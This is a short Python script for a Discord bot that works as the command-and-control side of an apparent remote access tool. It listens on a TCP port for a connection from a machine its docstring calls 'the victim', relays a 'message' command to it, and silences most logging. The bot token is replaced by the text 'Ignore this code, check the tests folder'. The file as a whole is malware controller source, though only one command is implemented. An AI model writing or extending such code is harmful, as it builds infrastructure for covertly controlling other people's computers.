import discord
from discord.ext import commands
from discord import app_commands
import tkinter as tk
from tkinter import messagebox as mb
import logging
import socket
import asyncio

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='/', intents=intents, help_command=None)
logging.basicConfig(level=logging.CRITICAL)
logging.basicConfig(level=logging.ERROR)
logging.getLogger('discord').setLevel(logging.CRITICAL)
logging.getLogger('discord.ext.commands').setLevel(logging.CRITICAL)
logging.getLogger('discord.client').setLevel(logging.ERROR)
logging.getLogger('discord.gateway').setLevel(logging.ERROR)

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
port = 5425
server_socket.bind((host, port))
server_socket.listen(5)
mb.showinfo(title="Listening", message="Server listening on {}:{}".format(host, port))
client_socket, addr = server_socket.accept()
mb.showinfo(title="Success", message="Got connection from {}".format(addr))

@bot.event
async def on_ready():
    try:
        await bot.tree.sync()
        mb.showinfo(title="Success", message="Successfully synced commands")
    except Exception as e:
        return e
@bot.tree.command(name = "message")
async def message(interaction: discord.Interaction):
    """Messages the victim"""
    await interaction.response.defer()
    client_socket.send("message".encode("utf-8"))
    await interaction.followup.send(client_socket.recv(1024).decode("utf-8"))

bot.run('Ignore this code, check the tests folder')
